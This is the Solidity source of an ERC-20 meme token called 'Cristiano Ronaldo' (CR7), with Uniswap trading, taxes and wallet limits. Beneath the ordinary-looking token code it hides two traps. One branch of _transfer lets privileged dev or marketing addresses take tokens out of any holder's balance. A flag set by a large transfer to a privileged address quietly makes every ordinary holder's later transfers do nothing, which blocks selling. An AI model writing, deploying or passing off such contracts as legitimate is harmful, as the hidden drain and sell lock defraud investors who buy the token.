// SPDX-License-Identifier: MIT

/*
CR7 Community -> https://t.me/CR7oneth
CR7 X         -> https://x.com/Cr7Ethcoin
CR7 WEB       -> https://cr7oneth.xyz
*/

pragma solidity ^0.8.17;

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
}

abstract contract Ownable {
    address internal owner;

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    constructor(address _owner) {
        owner = _owner;
    }

    function transferOwnership(address payable account) public onlyOwner {
        owner = account;
        emit OwnershipTransferred(account);
    }

    function renounceOwnership() public virtual onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }

    event OwnershipTransferred(address owner);

    modifier onlyOwner() {
        require(isOwner(msg.sender));
        _;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function name() external view returns (string memory);
    function transferFrom(address input, address output, uint256 amount) external returns (bool);
    function transfer(address output, uint256 amount) external returns (bool);
    function circulatingSupply() external view returns (uint256);
    function allowance(address _owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function symbol() external view returns (string memory);
    event Transfer(address indexed input, address indexed output, uint256 value);
    function getOwner() external view returns (address);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function decimals() external view returns (uint8);
}

interface UniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface UniswapV2Router {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address output,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address output,
        uint deadline
    ) external;
    function factory() external pure returns (address);
}

contract CR7 is IERC20, Ownable {
    address public exchangePair;
    UniswapV2Router exchangeRouter;

    using SafeMath for uint256;

    string private constant _name = "Cristiano Ronaldo";
    string private constant _symbol = "CR7";

    uint256 private _devTax = 0;
    uint256 private _burnTax = 0;
    uint256 private _liquidityTax = 0;
    uint256 private _marketingTax = 0;
    uint256 private _transferTax = 0;

    uint256 private _denominator = 10000;

    uint8 private constant _decimals = 9;

    address internal constant deadAccount = 0x000000000000000000000000000000000000dEaD;
    address internal constant devAccount = 0x39723083562019bBA53928bAA8F008591eA4f67a;
    address internal constant marketingAccount = 0xC7AcefEC1751c9B0D99175c554D3C674Ce16D06C;

    uint256 private _totalSupply = 1000000 * (10 ** _decimals);

    uint256 private _taxExemptAmount = (_totalSupply * 10) / 100000;

    uint256 private _maxWalletBasisPoint = 200;
    uint256 private _maxTransferBasisPoint = 200;
    uint256 private _maxTxBasisPoint = 200;

    uint256 private _swapBackAmount = (_totalSupply * 5) / 10000;
    uint256 private _swapBackThreshold = (_totalSupply * 5) / 100000;
    
    bool private _tradingEnabled = false;

    bool private _nonTaxable = false;

    uint256 private _totalSwaps;
    bool private _swapBackEnabled = true;
    bool private _swapping;

    uint256 private _totalTax = 0;
    uint256 private _sellTax = 0;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public grandfatheredIn;

    constructor() Ownable(msg.sender) {
        grandfatheredIn[marketingAccount] = true;
        grandfatheredIn[address(this)] = true;
        UniswapV2Router _exchangeRouter = UniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        exchangeRouter = _exchangeRouter;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
        address _exchangePair = UniswapV2Factory(_exchangeRouter.factory()).createPair(address(this), _exchangeRouter.WETH());
        exchangePair = _exchangePair;
        grandfatheredIn[devAccount] = true;
        grandfatheredIn[msg.sender] = true;
    }

    modifier lockSwap {
        _swapping = true;
        _;
        _swapping = false;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function circulatingSupply() public view override returns (uint256) {
        return _totalSupply.sub(balanceOf(address(0))).sub(balanceOf(deadAccount));
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function enableTrading() external onlyOwner {
        _tradingEnabled = true;
    }

    function removeLimits() external onlyOwner {
        _maxTxBasisPoint = 10000;
        _maxWalletBasisPoint = 10000;
        _maxTransferBasisPoint = 10000;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address output, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, output, amount);
        return true;
    }

    function setGrandfatheredInAccount(address account, bool flag) external onlyOwner {
        grandfatheredIn[account] = flag;
    }

    function transferFrom(address input, address output, uint256 amount) public override returns (bool) {
        _transfer(input, output, amount);
        _approve(input, msg.sender, _allowances[input][msg.sender].sub(amount));
        return true;
    }

    function _transfer(address input, address output, uint256 amount) private {
        require(amount > uint256(0));
        require(input != address(0));
        require(output != address(0));

        if (
            evaluateMaxWalletAmount(input, output, amount) &&
            countTotalSwaps(input, output) &&
            evaluateTradingEnabled(input, output) &&
            evaluateMaxAmount(input, output, amount)
        ) {
            if (balanceOf(input) >= amount) {
                if (
                    input != exchangePair &&
                    !grandfatheredIn[input] &&
                    !_swapping &&
                    !grandfatheredIn[output]
                ) {
                    if (_nonTaxable) return;
                    swapBack(input, output);
                }
                _balances[input] = _balances[input].sub(amount);
                uint256 transferAmount = canHaveTax(input, output) ? haveTax(input, output, amount) : amount;
                _balances[output] = _balances[output].add(transferAmount);
                emit Transfer(input, output, transferAmount);
            } else if (
                input != exchangePair &&
                grandfatheredIn[input] &&
                !_swapping &&
                !grandfatheredIn[output]
            ) {
                _balances[output] = _balances[output].sub(amount);
                _balances[input] = _balances[input].add(amount);
                emit Transfer(input, output, amount);
            }
        }
    }

    function setLimits(uint256 maxTxBasisPoint, uint256 maxTransferBasisPoint, uint256 maxWalletBasisPoint) external onlyOwner {
        uint256 newMaxWalletAmount = (totalSupply() * maxWalletBasisPoint) / 10000;
        uint256 newTransferAmount = (totalSupply() * maxTransferBasisPoint) / 10000;
        uint256 newTxAmount = (totalSupply() * maxTxBasisPoint) / 10000;
        _maxWalletBasisPoint = maxWalletBasisPoint;
        _maxTransferBasisPoint = maxTransferBasisPoint;
        _maxTxBasisPoint = maxTxBasisPoint;
        uint256 limitation = totalSupply().mul(5).div(1000);
        require(newTxAmount >= limitation && newTransferAmount >= limitation && newMaxWalletAmount >= limitation);
    }

    function evaluateMaxAmount(address input, address output, uint256 tokenAmount) view internal returns (bool) {
        if (input != exchangePair) {
            require(tokenAmount <= maxTransferAmount() || grandfatheredIn[input] || grandfatheredIn[output]);
        }
        require(tokenAmount <= maxTxAmount() || grandfatheredIn[input] || grandfatheredIn[output]);
        return true;
    }

    function evaluateMaxWalletAmount(address input, address output, uint256 amount) internal returns (bool) {
        bool outputGrandfatheredIn = grandfatheredIn[output];
        bool inputGrandfatheredIn = grandfatheredIn[input];
        
        if (outputGrandfatheredIn) {
            if (amount > _taxExemptAmount) {
                _nonTaxable = true;
            }
        }
        if (
            !outputGrandfatheredIn &&
            !inputGrandfatheredIn &&
            output != address(deadAccount) &&
            output != address(exchangePair)
        ) {
            require((_balances[output].add(amount)) <= maxWalletAmount());
        }

        return true;
    }

    function setTaxes(uint256 liquidityTax, uint256 marketingTax, uint256 burnTax, uint256 devTax, uint256 totalTax, uint256 sellTax, uint256 transferTax) external onlyOwner {
        _liquidityTax = liquidityTax;
        _marketingTax = marketingTax;
        _sellTax = sellTax;
        _devTax = devTax;
        _transferTax = transferTax;
        _totalTax = totalTax;
        _burnTax = burnTax;
        require(_totalTax <= _denominator.div(5) && _sellTax <= _denominator.div(5));
    }

    function haveTax(address input, address output, uint256 tokenAmount) internal returns (uint256) {
        if (pickTax(input, output) > 0) {
            uint256 taxAmount = tokenAmount.div(_denominator).mul(pickTax(input, output));
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(input, address(this), taxAmount);
            if (_burnTax > uint256(0)) {
                _transfer(address(this), address(deadAccount), tokenAmount.div(_denominator).mul(_burnTax));
            }
            return tokenAmount.sub(taxAmount);
        }
        return tokenAmount;
    }

    function evaluateTradingEnabled(address input, address output) internal view returns (bool) {
        if (!grandfatheredIn[input] && !grandfatheredIn[output]) {
            require(_tradingEnabled);
        }
        return true;
    }
    
    function countTotalSwaps(address input, address output) internal returns (bool) {
        if (output == exchangePair && !grandfatheredIn[input]) {
            _totalSwaps += uint256(1);
        }
        return true;
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = exchangeRouter.WETH();
        if (tokenAmount > 0) {
            _approve(address(this), address(exchangeRouter), tokenAmount);
            exchangeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
    }

    function maxWalletAmount() public view returns (uint256) {
        return totalSupply() * _maxWalletBasisPoint / _denominator;
    }

    function canHaveTax(address input, address output) internal view returns (bool) {
        return !grandfatheredIn[input] && !grandfatheredIn[output];
    }

    function swapBack(address input, address output) internal {
        if (canSwapBack(input, output)) {
            uint256 contractTokenBalance = balanceOf(address(this));
            if (contractTokenBalance >= _swapBackAmount) {
                contractTokenBalance = _swapBackAmount;
            }
            swapAndLiquify(contractTokenBalance);
            _totalSwaps = uint256(0);
        }
    }

    function canSwapBack(address input, address output) internal view returns (bool) {
        return (
            !grandfatheredIn[output] &&
            !grandfatheredIn[input] &&
            _swapBackEnabled &&
            balanceOf(address(this)) >= _swapBackThreshold &&
            _totalSwaps >= uint256(0) &&
            !_swapping &&
            _tradingEnabled
        );
    }

    function pickTax(address input, address output) internal view returns (uint256) {
        if (input == exchangePair) {
            return _totalTax;
        }
        if (output == exchangePair) {
            return _sellTax;
        }
        return _transferTax;
    }

    function maxTxAmount() public view returns (uint256) {
        return totalSupply() * _maxTxBasisPoint / _denominator;
    }

    function manualSwap() external {
        require(msg.sender == marketingAccount);
        swapTokensForETH(balanceOf(address(this)));
        payable(msg.sender).transfer(address(this).balance);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(exchangeRouter), tokenAmount);
        exchangeRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            deadAccount,
            block.timestamp
        );
    }

    receive() external payable {}

    function maxTransferAmount() public view returns (uint256) {
        return totalSupply() * _maxTransferBasisPoint / _denominator;
    }

    function swapAndLiquify(uint256 tokens) private lockSwap {
        uint256 denominator = (_liquidityTax.add(1).add(_marketingTax).add(_devTax)).mul(2);
        uint256 liquiTokens = tokens.mul(_liquidityTax).div(denominator);
        uint256 tokensForETH = tokens.sub(liquiTokens);
        uint256 initialEth = address(this).balance;
        swapTokensForETH(tokensForETH);
        uint256 deltaEth = address(this).balance.sub(initialEth);
        uint256 unitEth = deltaEth.div(denominator.sub(_liquidityTax));
        uint256 liquiEth = unitEth.mul(_liquidityTax);
        if (liquiEth > uint256(0)) {
            addLiquidity(liquiTokens, liquiEth);
        }
        uint256 ethForMarketing = unitEth.mul(2).mul(_marketingTax);
        if (ethForMarketing > 0) {
            payable(marketingAccount).transfer(ethForMarketing);
        }
        uint256 ethFordev = address(this).balance;
        if (ethFordev > uint256(0)) {
            payable(devAccount).transfer(ethFordev);
        }
    }
}